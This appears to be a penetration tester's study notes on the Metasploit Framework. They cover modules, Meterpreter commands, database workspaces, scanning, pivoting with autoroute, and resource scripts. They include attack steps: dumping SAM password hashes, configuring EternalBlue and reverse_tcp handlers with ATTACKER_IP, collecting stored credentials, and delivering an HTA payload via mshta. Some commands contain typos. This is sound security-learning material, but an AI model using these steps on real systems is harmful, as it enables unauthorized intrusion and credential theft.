# Metasploit Framework

Metasploit Framework is an open-source penetration testing and exploitation framework that is used by penetration testers ans security researchers worldwide.

It is also used by exploit developers and has one of the largest database of public, tested exploits.

It is designed to be modular, allowing for new functionality to be implemented with ease.

## MSF Architecture

### Interfaces
- **Metasploit Framework Console:** it is an easy-to-use all in one interface that provides access to all functionality of the MSF.
- **Metasploit Framework Command Line Interface:** it is a command line utility that is used to facilitate the creation of automation scripts that use Metasploit modules.
- **Metasploit Community Edition:** it is a web based GUI front-end for the MSF.
- **Armitage:** it is a free Java based GUI front-end for the MSD that simplifies network discovery, exploitation and post exploitation.

### Modules
- **Exploit:** a module that is used to take advantage of a vulnerability.
- **Payload:** is the malicious code that is executed on the target system after exploitation.
- **Encoder:** it is used to encode payloads in order to avoid AV detection.
- **NOPS:** used to ensure that payloads sizes are consistent and ensure the stability of a payload when executed.
- **Auxiliary:** it is used to perform additional functionality like port scanning or enumeration.

### Types of Payloads
- **Non-Staged Payload:** it is sent to the target system as a whole along along with the exploit.
- **Staged Payload**: it is sent to the target system in two parts:
    - **Stager:** it is responsible for initiating the reverse shell.
    - **Stage:** components that are downloaded and executed by the stager.

```bash
# List payloads
msfvenom --list payloads

# List Meterpreter payloads
msfvenom --list payloads | grep meterpreter

# List payloads for a specific exploit
show payloads
```

### Meterpreter

It stands for Meta-Interpreter is an advanced multi-functional payload that operates via DDL injection and is executed **in memory** on the target system, consequently marking it difficult to detect.

```bash
# Get PID used by Meterpreter
getpid

# Operating system and kernel version
sysinfo

# Display the user with which Meterpreter is currently running
getuid

# List processes
ps

# List processes with specific name
psgerp PROCESS_NAME

# Migrate to a different process
migrate PID

# Migrate to a different process using its name
migrate -N PROCESS_NAME

# List the content of the SAM database (First need to migrate to lsass process)
hashdump

# Kill current meterpreter session
exit

# Current sessions
sessions

# Run a meterpreter command on a session
sessions -C COMMAND -i SESSION_ID

# Kill all sessions
sessions -K

# Set name for a session
sessions -n SESSION_NAME

# Edit file
edit FILE_NAME

# Download a file
download FILE_NAME

# Upload file
upload FILE_TO_UPLOAD

# Get variable value
getenv ENVIRONMENT_KEY

# Search for files with backdoor name
search -d DIR -f *backdoor*

# Search for PHP files on a system
search -f *.PHP

# Open a shell session
shell

# Load python
load python

# Terminate a current shell
Ctrl+C
```

### Upgrading Command Shells to Meterpreter Shells

**Option 1**

```bash
use post/multi/manage/shell_to_meterpreter

set SESSION SESSION_ID

set LHOST ATTACKER_IP

run
```

**Option 2**

It uses the same post exploitation module as above.

```bash
sessions -u SESSION_ID
```

## Metasploit DB

```bash
# Manage the MSF DB
sudo msfdb 

# Initialize DB
sudo msfdb init

# Check DB status
sudo msfdb status
```


## Metasploit Framework Console

**MSF Common Module Variables**

- **LHOST:** variable used to store the IP address of the attacker's system.
- **LPORT:** variable used to store the port of the attacker's system.
- **RHOST:** variable used to store the IP address of the target system.
- **RHOSTS:** variable used to specify the IP addresses of multiple target systems.
- **RPORT:** variable used to store the port number of the target system.

```bash
# Open help menu
help

# Check version
version

# Show all available modules
show all

# Show exploits
show exploits

# Display help for the show command
show -h

# Search module
search SEARCH_VALUE

# Search for a specific cve, type and platform
search cve:2017 type:exploit platform:windows

# Use a module
use MODULE_NAME

# Display options
show options

# Set a variable
set VARIABLE_NAME VARIABLE_VALUE

# Execute a module
run

# Go back
back
```

**Exploits usage**

```bash
# Use EternalBlue exploit
use exploit/windows/smb/ms17_010_eternalblue

# Set the correct payload options: LHOST and LPORT
set LHOST ATTACKER_IP
set LPORT ATTACKER_PORT

# Change the payload
set payload PAYLOAD_NAME
```

```bash
# Display active sessions
sessions

# It is similar to netcat and provides the banner.
connect TARGET_IP TARGET_PORT

# Display targets on a workspace
hosts

#Get credentials
loot

# Dump all credentials
creds
```

### Workspaces

A new workspace should be created for each engagement.

```bash
# Check the status of the DB
db_status

# List workspaces
workspace

# Create a new workspace
workspace -a WORKSPACE_NAME

# Change workspace
workspace WORKSPACE_NAME

# Delete workspace
workspace -d WORKSPACE_NAME

# Rename
workspace -r WORKSPACE_NAME NEW_NAME
```

## Import Nmap results into MSF

1. Start the MSF DB: `service postgresql start`
2. Start MSF: `msfconsole`
3. Check the status of the database: `db_status`
4. Create a new workspace: `workspace -a WORKSPACE_NAME`
5. Import Nmap scan results: `db_import NMAP_FILE.XML`
6. Confirm results have been imported: `hosts`
7. Enumerate services of the imported hosts: `services`
8. List vulnerabilities: `vulns`

> Initiate a nmap scan from MSF: `db_nmap -Pn -sV -sO TRAGET_IP`


## Port scanning with auxiliary modules

Auxiliary modules are used to perform functionality like scanning, discovery and fuzzing. They cannot be paired with payloads, they can only be used to extract information.

Usage example: these modules can be used to scan a target that has already been compromised, in order to scan the network to which the target system is connected.

Once a target is compromised, a shell can be opened on the target system

```bash
# Open shell session
shell

# Spawn bash session
/bin/bash -i
```

Add the route for a second target using the meterpreter session.

``` bash
# TARGET_IP is the IP of the other network interface of the compromised machine, the IP of the network that is connected to the second target host
run autoroute -s TARGET_IP
```

Sessions management

```bash
# Background session
background

# Check sessions
sessions

# Change to session
sessions -i SESSION_ID
```

Port scan module usage

```bash
# Search for auxiliary modules
search MODULE_NAME

# Example
search portscan

# Use a module
use MODULE_NAME

# Example scan TCP ports
use auxiliary/scanner/portscan/tcp

# Show options module
show options

# Set values
set OPTION_NAME VALUE

# Run module
run

# Go back
back
```

Auxiliary module used to perform UDP scan on a target system: `auxiliary/scanner/discovery/udp_sweep`.


## Vulnerability Scanning with MSF

It is the process of scanning a target for vulnerabilities and verifying they can be exploited.


```bash
#Run MSF
msfconsole -q

# Create a new workspace
workspace -a WORKSPACE_NAME

# First check service versions
db_nmap -sS -sV -O TARGET_IP

# Check stored data
hosts

# Check services
services

# Search for specific exploits
search tye:exploit name:Microsoft IIS

# Use module
use MODULE_NAME

# Display information of a particular module
info

# It makes an analysis of the target host
analyze

# Detect vulnerabilities for the target host
vulns
```

**exploit/multi/http/glassfish_deployer**

```bash
use exploit/multi/http/glassfish_deployer

# Display information related to a specific method
info

# Set correct payload
set payload windows/meterpreter/reverse_tcp

# Set APP_PORT
set APP_PORT TARGET_PORT

# Set RHOSTS
set TARGET_IP

# Set LHOSTS
set LHOSTS IP
```

### metasploit-autopwn

It is a plugin used to easily identify vulnerabilities and exploits for the open ports on a  target system.

> It only works if there is information in the MSF database.

```bash
wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb

# Move the plugin to the plugins folder
sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins/

# Load plugins in MSF
load db_autopwn

# Run plugin
db_autopwn

# Narrow down results to a specific service
db_autopwn -p -t -PI 445
```

### searchsploit

```bash
# Example: SMB exploits for Metasploit
searchsploit "Microsoft Windows SMB" | grep -e "Metasploit"
```

## Automate Metasploit With Resource Scripts

They allow users to automate repetitive tasks and commands.

```bash
# List default Resource Scripts
ls -la /usr/share/metasploit-framework/scripts/resource/

# Run a Resource Script
msfconsole -r SCRIPT_NAME.rc

# Load Resource Scripts from msfconsole
resource SCRIPT_NAME.rc

# Export commands into a Resource Script
makerc PATH/SCRIPT_NAME.rc
```

**Handler example script**

```bash
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST
set LPORT
run
```

**Port scan example**

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS TARGET_IP
run
```

## Running hta_server module

Running the hta_server module to gain the meterpreter shell.

```bash
use exploit/windows/misc/hta_server
exploit

# Open the generated payload with mshta command 
mshta.exe PAYLOAD
```